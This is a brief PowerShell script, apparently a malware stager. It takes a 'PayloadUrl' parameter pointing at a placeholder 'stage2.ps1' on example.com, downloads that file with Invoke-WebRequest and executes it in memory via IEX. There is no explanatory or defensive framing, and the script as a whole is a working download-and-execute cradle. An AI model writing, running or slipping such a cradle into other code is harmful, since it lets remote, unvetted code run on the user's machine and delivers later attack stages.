
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://example.com/stage2.ps1",
    [int]$TimeoutSec = 135
)
IEX (Invoke-WebRequest -Uri $PayloadUrl -UseBasicParsing).Content
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
